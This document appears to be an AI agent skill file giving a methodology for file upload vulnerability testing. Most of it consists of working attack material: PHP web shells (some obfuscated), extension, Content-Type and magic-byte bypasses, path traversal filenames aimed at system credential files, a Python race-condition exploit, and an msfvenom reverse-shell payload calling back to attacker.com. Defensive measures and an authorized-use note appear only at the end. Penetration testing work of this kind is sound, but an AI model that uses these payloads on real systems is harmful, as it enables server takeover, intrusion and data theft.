---
name: file-upload-testing
Description: Professional skills and methodology for file upload vulnerability testing
version: 1.0.0
---

#File upload vulnerability test

## Overview

The file upload function is a common function of web applications, but it involves various security risks. This skill provides methods for detecting, exploiting, and protecting file upload vulnerabilities.

## Vulnerability type

### 1. Unverified file type

**Frontend validation only:**
```javascript
// Can be bypassed
if (!file.name.endsWith('.jpg')) {
Alert('Only images are allowed to be uploaded');
}
```

### 2. The file content is not verified

**Check extension only:**
```php
// Dangerous code
if (pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION) == 'jpg') {
  move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);
}
```

### 3. Path traversal

**Unfiltered filename:**
```
filename: ../../../etc/passwd
filename: ..\..\..\windows\system32\config\sam
```

### 4. File name overwriting

**Predictable filenames:**
```
uploads/1.jpg
uploads/2.jpg
```

## Test method

### 1. Basic detection

**Test various file types:**
- .php, .jsp, .asp, .aspx
- .php3, .php4, .php5, .phtml
- .jspx, .jspf
- .htaccess, .htpasswd

**Testing dual extensions:**
```
shell.php.jpg
shell.jpg.php
```

**Test case:**
```
shell.PHP
shell.PhP
```

### 2. Content type bypass

**Modify Content-Type:**
```
Content-Type: image/jpeg
# But the file content is PHP code
```

**Magic Bytes：**
```php
// Add image header before PHP code
GIF89a<?php phpinfo(); ?>
```

### 3. Parsing vulnerabilities

**Apache parsing vulnerability:**
```
shell.php.xxx  # Apache may resolve to PHP
```

**IIS parsing vulnerability:**
```
shell.asp;.jpg
shell.asp:.jpg
```

**Nginx parsing vulnerability:**
```
shell.jpg%00.php
```

### 4. Race conditions

**Access immediately after file upload:**
```python
# Upload the .php file and access it after the upload is complete but before deletion
import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('http://target.com/upload', files=files)

def access():
    time.sleep(0.1)
    requests.get('http://target.com/uploads/shell.php?cmd=id')

threading.Thread(target=upload).start()
threading.Thread(target=access).start()
```

## Leverage technology

### PHP WebShell

**Basic WebShell:**
```php
<?php system($_GET['cmd']); ?>
```

**One sentence Trojan:**
```php
<?php eval($_POST['a']); ?>
```

**Bypass filtering:**
```php
<?php
$_GET['cmd']($_POST['a']);
// Use: ?cmd=system
```

### .htaccess utilization

**Upload .htaccess:**
```
AddType application/x-httpd-php .jpg
```

**Then upload shell.jpg (actually PHP code)**

### Picture Horse

**GIF Picture Horse:**
```php
GIF89a
<?php
phpinfo();
?>
```

**PNG image horse:**
```bash
# Use tools to embed PHP code into PNG
python3 png2php.py shell.php shell.png
```

### File contains matches

**If a file inclusion vulnerability exists:**
```
# Upload images containing PHP code
# Then execute it through file inclusion
?file=uploads/shell.jpg
```

## Bypass technology

### Extension bypass

**Double extension:**
```
shell.php.jpg
shell.php;.jpg
shell.php%00.jpg
```

**Case:**
```
shell.PHP
shell.PhP
```

**Special characters:**
```
shell.php.
shell.php 
shell.php%20
```

### Content-Type Bypass

**Modify request header:**
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### Magic Bytes Bypass

**Add file header:**
```php
// JPEG
\xFF\xD8\xFF\xE0<?php phpinfo(); ?>

// GIF
GIF89a<?php phpinfo(); ?>

// PNG
\x89\x50\x4E\x47<?php phpinfo(); ?>
```

### Code obfuscation

**Use short tags:**
```php
<?= system($_GET['cmd']); ?>
```

**Use variables:**
```php
<?php
$a='sys';
$b='tem';
$a.$b($_GET['cmd']);
```

## Tool usage

### Burp Suite

1. Intercept file upload requests
2. Modify file name and content
3. Test various bypass techniques

### Upload Bypass

```bash
# Test file upload using various techniques
python upload_bypass.py -u http://target.com/upload -f shell.php
```

### WebShell generation

```bash
# Generate various WebShells
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php
```

## Validation and reporting

### Verification steps

1. Confirm that malicious files can be uploaded
2. Verify that the file can be executed
3. Assess the impact (command execution, data leakage, etc.)
4. Record a complete POC

### Report Highlights

- Vulnerability location and upload function
- Uploadable file types and execution methods
- Complete exploitation steps and PoC
- Repair suggestions (file type verification, content inspection, safe storage, etc.)

## Protective measures

### Recommended plan

1. **File type whitelist**
   ```python
   ALLOWED_EXTENSIONS = {'jpg', 'png', 'gif'}
   ext = filename.rsplit('.', 1)[1].lower()
   if ext not in ALLOWED_EXTENSIONS:
       raise ValueError("File type not allowed")
   ```

2. **File content verification**
   ```python
   import magic
   file_type = magic.from_buffer(file_content, mime=True)
   if not file_type.startswith('image/'):
       raise ValueError("Invalid file content")
   ```

3. **Rename file**
   ```python
   import uuid
   filename = str(uuid.uuid4()) + '.' + ext
   ```

4. **Isolated Storage**
- Files stored outside the web root directory
- Access via script proxy
- Disable execution permissions

5. **File Scanning**
- Scan using anti-virus software
- Check file contents
- Remove executable permissions

6. **Size Limitation**
   ```python
   MAX_SIZE = 5 * 1024 * 1024  # 5MB
   if file.size > MAX_SIZE:
       raise ValueError("File too large")
   ```

## Notes

- Only conducted in an authorized testing environment
- Avoid uploading malicious files to the production environment
- Clean up promptly after testing
- Pay attention to the differences in parsing between different servers